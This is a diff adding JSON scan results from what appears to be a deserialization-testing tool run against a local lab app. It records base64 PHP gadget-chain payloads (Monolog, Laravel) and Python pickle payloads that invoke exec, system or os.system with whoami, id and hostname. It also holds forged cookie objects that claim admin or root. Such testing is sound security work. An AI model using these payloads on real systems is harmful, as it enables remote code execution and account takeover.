+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/profile.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/dashboard.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 2,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/dashboard.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 2,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        }
+      ]
+    }
+  ]
+}
